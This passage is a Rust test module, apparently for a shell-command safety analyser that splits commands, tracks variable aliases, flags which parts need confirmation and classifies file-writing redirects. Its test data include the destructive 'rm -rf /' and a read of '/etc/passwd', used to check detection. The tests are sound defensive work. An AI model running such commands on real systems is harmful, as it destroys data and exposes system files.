                "P='/work/project' ~ P=relative/path ~ P+=/work/project ~ P=(/work/project) ~ P[0]=/work/project",
            ),
            (
                "shape",
                "P=/work/project Q=/work/other ~ P=/work/project echo $P ~ P=/work/project > /dev/null",
            ),
            ("prefix", "! P=/work/project ~ time P=/work/project"),
            (
                "control",
                "P=/work/project | cat ~ P=/work/project && echo $P ~ P=/work/project & echo $P ~ echo first; P=/work/project",
            ),
        ];
        for (label, declaration) in groups
            .into_iter()
            .flat_map(|(label, cases)| cases.split(" ~ ").map(move |case| (label, case)))
        {
            let command = format!("{declaration}; echo $P; rm -rf /");
            let leaves = confirmation_leaves(&command);
            let declaration = leaves
                .iter()
                .find(|leaf| leaf.original.contains('P') && leaf.original.contains('='))
                .expect("unsupported declaration must remain analyzable");
            assert!(
                declaration.requires_confirmation.is_some(),
                "{label} case {command:?}"
            );
            assert_eq!(leaves.last().unwrap().original, "rm -rf /");
        }
    }

    #[test]
    fn alias_assignments_remain_visible_and_do_not_consume_bindings() {
        assert!(
            leaves("X=value; echo ok", "")
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_none())
        );

        let unused = p_leaves("P=/work/project; echo ok");
        assert_eq!(unused.len(), 2);
        assert!(unused[0].requires_confirmation.is_some());

        let leaves = p_leaves("P=/work/project; X=$P");
        assert_eq!(leaves.len(), 2);
        assert!(
            leaves
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_some())
        );
        assert_eq!(leaves[1].original, "X=$P");

        let reassigned = p_leaves("P=/work/project; P=$P/other; echo $P/file");
        assert_eq!(reassigned.len(), 3);
        assert!(
            reassigned
                .iter()
                .all(|leaf| leaf.requires_confirmation.is_some())
        );
    }

    #[test]
    fn unsupported_alias_references_force_confirmation() {
        let cases = "P=/work/project; echo \"$P/file\" ~ P=/work/project; echo $P/${P} ~ P=/work/project; echo ${P:-/tmp} ~ P=/work/project; echo ${#P} ~ P=/work/project; echo ${!P} ~ P=/work/project; echo ${P/foo/bar} ~ P=/work/project; echo ${P[0]} ~ echo $P/file";
        for command in cases.split(" ~ ") {
            let leaves = confirmation_leaves(command);
            let reference = leaves
                .iter()
                .find(|leaf| leaf.original.starts_with("echo "))
                .expect("alias reference must remain analyzable");
            assert!(
                reference.requires_confirmation.is_some(),
                "case {command:?}"
            );
        }
    }

    #[test]
    fn alias_mutation_barriers_invalidate_bindings() {
        let groups = [
            (
                "shell control",
                "IFS=/|unset IFS|export IFS=/|printf -v IFS /",
            ),
            (
                "wrapped",
                "unset P|unset Q|command unset P|builtin unset P|exec echo ok",
            ),
            (
                "declaration",
                "export P=/tmp|export P+=/tmp|readonly P|declare P=/tmp|declare -n REF=P|declare -i Q=P=0|typeset P=/tmp|typeset -n REF=P|typeset -i Q=P=0|local P=/tmp|local -i Q=P=0|builtin declare -n REF=P|Q[P=0]=x",
            ),
            (
                "input",
                "read P|mapfile P|mapfile -c 1 -C 'unset P' L|readarray P|readarray -C 'unset P' L|getopts x P|printf -v P /tmp|printf -vP /tmp|printf -v 'P[0]' /tmp|printf -v 'Q[P=0]' x",
            ),
            (
                "dynamic",
                r##"let P=0|eval noop|$'eval' 'P=/tmp'|$"eval" 'P=/tmp'|source file|. file|trap noop EXIT|"$MUTATOR" P"##,
            ),
        ];
        for (label, mutation) in groups
            .into_iter()
            .flat_map(|(label, cases)| cases.split('|').map(move |case| (label, case)))
        {
            let command = format!("P=/work/project; echo $P/file; {mutation}; echo $P/after");
            let leaves = p_leaves(&command);
            assert!(
                leaves[1..]
                    .iter()
                    .all(|leaf| leaf.requires_confirmation.is_some()),
                "{label} mutation {mutation:?}: {leaves:?}"
            );
            assert_eq!(leaves[2].match_text, "echo $P/after");
            assert!(leaves[2].bindings.is_empty());
        }
    }

    #[test]
    fn redirect_classification_uses_alias_expansion() {
        for (path, expected) in [("/dev/null", false), ("/tmp/output", true)] {
            let command = format!("P={path}; echo hi > $P");
            let leaves = leaves_with_aliases(&command, "", &["P"]);
            assert_eq!(leaves.len(), 1);
            assert_eq!(leaves[0].real_file_write, expected, "path {path}");
        }
    }

    #[test]
    fn classifies_real_file_write_redirects() {
        let write_cases = [
            "echo x > out.txt",
            "echo x >> out.txt",
            "echo x >| out.txt",
            // &> / &>> send stdout+stderr to a real file (OutputAndError).
            "echo x &> out.txt",
            "echo x &>> out.txt",
            // >& with a non-fd target writes a file (DuplicateOutput + Duplicate(filename)).
            "echo x >& out.txt",
            // <> opens for read+write (ReadAndWrite).
            "echo x <> out.txt",
        ];
        for command in write_cases {
            assert!(
                leaves(command, "")[0].real_file_write,
                "expected real_file_write for {command:?}"
            );
        }

        let benign_cases = [
            "ls 2>/dev/null",
            "ls >/dev/null",
            "ls 2>&1",
            // &>/dev/null is the discard form, not a real-file write.
            "ls &>/dev/null",
            // >&- closes a descriptor; >&2 / 2>&1 duplicate one.
            "ls >&-",
            "ls >&2",
            "echo hi",
            "cat < input.txt",
        ];
        for command in benign_cases {
            assert!(
                !leaves(command, "")[0].real_file_write,
                "expected no real_file_write for {command:?}"
            );
        }
    }

    #[test]
    fn redirect_to_real_file_keeps_operator_in_leaf_text() {
        assert_eq!(texts("echo x > out.txt", ""), vec!["echo x > out.txt"]);
    }

    #[test]
    fn normalizes_in_cwd_absolute_paths() {
        assert_eq!(
            texts("cat /abs/cwd/src/foo.rs", "/abs/cwd"),
            vec!["cat src/foo.rs"]
        );
    }

    #[test]
    fn normalization_leaves_unrelated_paths_untouched() {
        // Outside cwd, already-relative, parent-traversal, and partial-directory-name matches are
        // all left exactly as written.
        assert_eq!(
            texts("cat /etc/passwd", "/abs/cwd"),
            vec!["cat /etc/passwd"]
        );
        assert_eq!(texts("cat src/foo.rs", "/abs/cwd"), vec!["cat src/foo.rs"]);
        assert_eq!(
            texts("cat /abs/cwd/../secret", "/abs/cwd"),
            vec!["cat /abs/cwd/../secret"]
        );
        assert_eq!(
            texts("cat /abs/cwdX/foo", "/abs/cwd"),
            vec!["cat /abs/cwdX/foo"]
        );
    }

    #[test]
    fn empty_cwd_disables_normalization() {
        // The replay path falls back to an empty cwd for records that predate cwd logging; the
        // absolute path must then pass through untouched rather than being mangled.
        assert_eq!(
            texts("cat /abs/cwd/src/foo.rs", ""),
            vec!["cat /abs/cwd/src/foo.rs"]
        );
    }

    #[test]
    fn normalization_preserves_other_tokens_byte_for_byte() {
        // Only the in-cwd path is rewritten; the quoted argument keeps its quotes and spaces.
        assert_eq!(
            texts(r#"cat /abs/cwd/a.rs "keep me""#, "/abs/cwd"),
            vec![r#"cat a.rs "keep me""#]
        );
    }

    #[test]
    fn normalizes_redirect_target_paths() {
        let leaf = &leaves("cat < /abs/cwd/input.txt", "/abs/cwd")[0];
        assert_eq!(leaf.match_text, "cat < input.txt");
        assert!(!leaf.real_file_write);
    }

    #[test]
    fn unicode_command_slices_by_char_not_byte() {
        // A multi-byte argument before another token would corrupt a byte-indexed slice.
        assert_eq!(texts("echo 世界 ok", ""), vec!["echo 世界 ok"]);
    }

    #[test]
    fn build_leaf_text_falls_back_when_a_span_is_missing() {
        // Directly exercise the missing-span fallback, which is otherwise hard to trigger because
        // the parser populates spans for ordinary words.
        let words = vec![
            LeafWord {
                original_value: "cat".to_string(),
                expanded_value: "cat".to_string(),
                value: "cat".to_string(),
                span: Some((0, 3)),
            },
            LeafWord {
                original_value: "/abs/cwd/foo.rs".to_string(),
                expanded_value: "/abs/cwd/foo.rs".to_string(),
                value: "src/foo.rs".to_string(),
                span: None,
            },
        ];
        let chars: Vec<char> = "cat /abs/cwd/foo.rs".chars().collect();
        assert_eq!(
            build_leaf_text(&words, &chars, LeafTextStage::Normalized),
            "cat src/foo.rs"
        );
    }

    #[test]
    fn fd_dup_target_classification() {
        assert!(is_fd_dup_target("1"));
        assert!(is_fd_dup_target("2-"));
        assert!(is_fd_dup_target("-"));
        assert!(!is_fd_dup_target("out.txt"));
        assert!(!is_fd_dup_target(""));
    }
}
